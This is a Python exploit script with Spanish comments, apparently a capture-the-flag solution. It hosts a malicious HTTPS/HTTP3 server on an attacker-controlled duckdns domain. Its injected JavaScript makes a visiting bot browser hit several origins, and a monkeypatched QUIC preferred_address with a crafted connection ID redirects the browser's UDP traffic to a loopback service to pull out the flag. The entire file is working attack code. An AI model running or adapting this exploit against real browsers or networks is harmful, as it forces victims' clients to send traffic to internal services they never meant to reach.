#!/usr/bin/env python3
# EXPLOIT v2 — multi-origen: cada puerto TCP tiene su Alt-Svc/QUIC => más migraciones por visita

import asyncio
import socket
import ssl
import threading

import aioquic.quic.connection as conn
from aioquic.asyncio import QuicConnectionProtocol, serve
from aioquic.h3.connection import H3Connection
from aioquic.h3.events import HeadersReceived
from aioquic.quic.configuration import QuicConfiguration
from aioquic.quic.events import ProtocolNegotiated
from aioquic.quic.packet import QuicPreferredAddress

HOST = "damik0ctf.duckdns.org"
PORTS = [(8443, 9443), (8444, 9444), (8445, 9445), (8446, 9446)]  # (tcp, udp)
CID = b"ive me the flag bro\n"  # 20 bytes exactos: la frase con el \n final DENTRO del CID

Real = conn.QuicTransportParameters


def params(**kw):
    p = Real(**kw)
    p.preferred_address = QuicPreferredAddress(
        ipv4_address=None,
        ipv6_address=("::ffff:127.0.0.1", 6767),  # IPv6 para el navegador, IPv4 al socket
        connection_id=CID,
        stateless_reset_token=bytes(16),
    )
    return p


conn.QuicTransportParameters = params
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain("certs/fullchain.pem", "certs/privkey.pem")


class H3(QuicConnectionProtocol):
    def quic_event_received(self, event):
        if isinstance(event, ProtocolNegotiated):
            print("[h3] handshake recibido", flush=True)
            self.h3 = H3Connection(self._quic)
        elif getattr(self, "h3", None):
            for ev in self.h3.handle_event(event):
                if isinstance(ev, HeadersReceived):
                    self.h3.send_headers(ev.stream_id, [(b":status", b"200")], end_stream=False)
                    self.h3.send_data(ev.stream_id, b"ok", end_stream=True)
        self.transmit()


def tcp_listener(tcp_port, udp_port):
    ls = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
    ls.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    ls.bind(("::", tcp_port))
    ls.listen()

    # la página golpea TODOS los orígenes, repetido en el tiempo (ventana del TIMEOUT del bot)
    otros = ",".join(str(t) for t, _ in PORTS)
    js = (
        f"var P=[{otros}];"
        "function go(){P.forEach(p=>fetch('https://' + location.hostname + ':' + p + '/?'+Math.random()).catch(()=>{}));}"
        "go();[300,600,1000,1500,2200,3000,4000,5000,6500,8000].forEach(t=>setTimeout(go,t));"
    )
    body = f"<!doctype html><script>{js}</script>".encode()

    def loop():
        while True:
            c, addr = ls.accept()
            print(f"[tcp:{tcp_port}] conexión desde {addr[0]}", flush=True)
            try:
                c = ctx.wrap_socket(c, server_side=True)
                c.recv(65536)
                c.sendall(
                    b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n"
                    + f'Alt-Svc: h3=":{udp_port}"; ma=300\r\n'.encode()
                    + b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n"
                    + body
                )
                c.close()
            except Exception:
                pass

    threading.Thread(target=loop, daemon=True).start()


async def main():
    for tcp_port, udp_port in PORTS:
        tcp_listener(tcp_port, udp_port)
        config = QuicConfiguration(is_client=False, alpn_protocols=["h3"])
        config.load_cert_chain("certs/fullchain.pem", "certs/privkey.pem")
        await serve(HOST, udp_port, configuration=config, create_protocol=H3)
        print(f"[+] origen :{tcp_port} (h3 -> :{udp_port})", flush=True)
    await asyncio.Future()


asyncio.run(main())
